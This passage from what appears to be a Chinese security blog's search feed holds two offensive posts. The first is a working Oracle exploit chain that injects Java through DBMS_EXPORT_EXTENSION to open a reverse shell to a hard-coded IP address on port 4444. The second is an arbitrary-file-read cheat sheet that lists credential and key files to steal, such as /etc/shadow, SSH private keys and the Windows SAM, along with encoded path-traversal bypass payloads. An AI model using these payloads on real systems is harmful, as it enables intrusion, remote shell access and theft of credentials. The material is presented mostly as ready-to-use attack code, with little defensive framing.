class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#x27;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#123;/g</span>, <span class="hljs-string">&#x27;&amp;#123;&#x27;</span>)<br>    .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&#125;/g</span>, <span class="hljs-string">&#x27;&amp;#125;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>与_config.yml#48</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">highlight:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">auto_detect:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tab_replace:</span> <span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-attr">wrap:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">hljs:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">prismjs:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">preprocess:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tab_replace:</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>从数据库到getshell</title>
    <link href="/2022/06/22/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%B0getshell/"/>
    <url>/2022/06/22/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%B0getshell/</url>
    
    <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql">#创建代码<br><span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">&#x27;FOO&#x27;</span>,<span class="hljs-string">&#x27;BAR&#x27;</span>,<span class="hljs-string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace and compile java source named &quot;shell&quot; as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa=&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 9&lt;&gt; /dev/tcp/101.33.203.2/4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&quot;&#125;;Process p=Runtime.getRuntime().exec(aaa);&#125;&#125;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="hljs-string">&#x27;SYS&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual<br><br>#赋予java权限<br><span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">&#x27;FOO&#x27;</span>,<span class="hljs-string">&#x27;BAR&#x27;</span>,<span class="hljs-string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;begin dbms_java.grant_permission( &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;PUBLIC&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;SYS:java.net.SocketPermission&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&lt;&gt;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;*&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27; );end;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="hljs-string">&#x27;SYS&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual<br><br>#创建函数<br><span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">&#x27;FOO&#x27;</span>,<span class="hljs-string">&#x27;BAR&#x27;</span>,<span class="hljs-string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace function reversetcp RETURN VARCHAR2 as language java name &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;shell.run() return String&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="hljs-string">&#x27;SYS&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual<br><br>#赋予执行权限<br><span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">&#x27;FOO&#x27;</span>,<span class="hljs-string">&#x27;BAR&#x27;</span>,<span class="hljs-string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant all on reversetcp to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="hljs-string">&#x27;SYS&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual<br><br>#执行反弹<br><span class="hljs-keyword">select</span> sys.reversetcp <span class="hljs-keyword">from</span> dual<br><br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
    <tags>
      
      <tag>database</tag>
      
      <tag>getshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFR深入利用的一些技巧</title>
    <link href="/2022/05/23/AFR%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/05/23/AFR%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="敏感文件路径"><a href="#敏感文件路径" class="headerlink" title="敏感文件路径"></a>敏感文件路径</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\boot.ini #查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件<br>C:\Windows\repair\sam #存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini #Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD #Mysql root<br>C:\Windows\php.ini #php配置信息<br>C:\Windows\my.ini #Mysql配置信息<br></code></pre></td></tr></table></figure><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">/root/.ssh/authorized_keys #如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br>/root/.ssh/id_rsa #ssh私钥,ssh公钥是id_rsa.pub,私钥登录 ssh -i id_rsa root@IP地址<br>/root/.ssh/id_ras.keystore #记录每个访问计算机用户的公钥<br>/root/.ssh/known_hosts<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br>/etc/passwd # 账户信息<br>/etc/shadow # 账户密码文件<br>/etc/my.cnf #mysql 配置文件<br>/etc/httpd/conf/httpd.conf # Apache配置文件<br>/etc/redhat-release #系统版本 <br>/root/.bash_history #用户历史命令记录文件<br>/root/.mysql_history #mysql历史命令记录文件<br>/var/lib/mlocate/mlocate.db #全文件路径<br>/proc/self/fd/fd[0-9]*(文件标识符)<br>/proc/mounts #记录系统挂载设备<br>/porc/config.gz #内核配置文件<br>/porc/self/cmdline #当前进程的cmdline参数<br>/proc/sched_debug #配置文件可以看到当前运行的进程并可以获得对应进程的pid<br>/proc/pid/cmdline   #可以看到对应pid进程的完整命令行。<br>/proc/net/fib_trie   #内网IP<br>/proc/self/environ   #环境变量<br>/proc/self/loginuid   #当前用户<br></code></pre></td></tr></table></figure><h4 id="用户家目录"><a href="#用户家目录" class="headerlink" title="用户家目录"></a>用户家目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">.bash_history <br>.zsh_history<br>.psql_history<br>.mysql_history<br>.profile <br>.bashrc<br>.gitconfig<br>.viminfo<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">暴破所有用户的.bash_history：</span><br>../../../home/§root§/.bash_history<br><br></code></pre></td></tr></table></figure><h4 id="主机凭证"><a href="#主机凭证" class="headerlink" title="主机凭证"></a>主机凭证</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">/root/.ssh/id_rsa  #私钥<br>/root/.ssh/authorized_keys  #公钥存储文件<br>/root/.ssh/id_rsa.keystore<br>/root/.ssh/known_hosts #记录每个访问计算机用户的公钥<br></code></pre></td></tr></table></figure><h4 id="全盘路径⭐"><a href="#全盘路径⭐" class="headerlink" title="全盘路径⭐"></a>全盘路径⭐</h4><p>适用于目标机器安装了mlocate的情况，不过一般可能需要root权限，locate命令利用<code>mlocate.db</code>数据库进行全盘文件名搜索，位置在<code>/var/lib/mlocate/mlocate.db</code>，获取到<code>mlocate.db</code>文件后本地利用如下命令输出指定路径：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">locate -d mlocate.db /   #输出所有文件路径<br>locate -d mlocate.db config #输出所有文件名包含config的文件路径<br></code></pre></td></tr></table></figure><h4 id="后端配置文件"><a href="#后端配置文件" class="headerlink" title="后端配置文件"></a>后端配置文件</h4><ul><li>java站点<br><code>/WEB-INF/web.xml</code><br><code>/WEB-INF/classes/applicationContext.xml</code><br><code>/WEB-INF/classes/xxx/xxx/xxx.class</code><br><code>core.jar</code>: 如果遇到Shiro站点，可以直接利用全盘路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li><li>tomcat<br><code>/usr/local/tomcat/conf/tomcat-users.xml</code></li><li>nginx<br><code>/www/nginx/conf/nginx.conf</code><br><code>/etc/nginx/nginx.conf</code><br><code>/usr/local/nginx/conf/nginx.conf</code><br><code>/usr/local/etc/nginx/nginx.conf</code></li><li>apache<br><code>/etc/httpd/conf/httpd.conf</code><br><code>/etc/apache2/apache2.conf</code><br><code>/etc/apache2/httpd.conf</code></li><li>redis<br><code>/etc/redis.conf</code></li><li>ssh<br><code>/etc/ssh/sshd_config</code></li></ul><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><ul><li><p>tomcat<br>可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径<br><code>/webapps/ROOT/logs/catalina.out</code></p></li><li><p>apache<br><code>/var/log/apache2/access.log</code><br><code>/var/log/apache2/error.log</code><br><code>/var/log/httpd/access_log</code><br><code>/etc/httpd/logs/access_log</code><br><code>/etc/httpd/logs/error_log</code><br><code>/etc/httpd/logs/error.log</code></p></li><li><p>nginx<br><code>/var/log/nginx/access.log</code><br><code>/var/log/nginx/error.log</code><br><code>/usr/local/var/log/nginx/access.log</code><br><code>/usr/local/nginx/logs</code></p></li><li><p>jetty</p><p><code>/usr/local/services/jetty-8.1.16/logs/stderrout.log</code><br><code>/usr/local/services/jetty-8.1.16/etc/jetty.xml</code></p></li></ul><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><ol><li>url编码代替.或者&#x2F;，如使用%2F代替&#x2F;<br><code>?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></li><li>二次编码(%25)<br><code>?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd</code></li><li>加入+<br><code>?filename=.+./.+./bin/redacted.dll</code></li><li>%00<br><code>?filename=.%00./file.php</code><br><code>/etc/passwd%00.jpg</code></li><li><code>\</code><br><code>?filename=..%5c..%5c/windows/win.ini</code></li><li>Java %c0%ae 安全模式绕过<br><code>?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code></li></ol><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>任意文件读取</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
